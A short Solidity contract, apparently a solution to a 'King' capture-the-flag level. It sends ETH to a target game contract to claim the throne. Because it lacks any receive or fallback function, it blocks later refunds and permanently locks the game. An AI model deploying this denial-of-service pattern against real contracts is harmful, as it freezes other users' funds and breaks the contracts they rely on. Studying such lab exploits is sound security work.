// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackKing {

  address kingContract;

  constructor(address _kingContract) {
    kingContract = _kingContract;
  }

  function attackKingGame() external payable {
    (bool res, ) = payable(kingContract).call{ value: msg.value }("");
    require(res, "Error while claiming the throne");
  }
}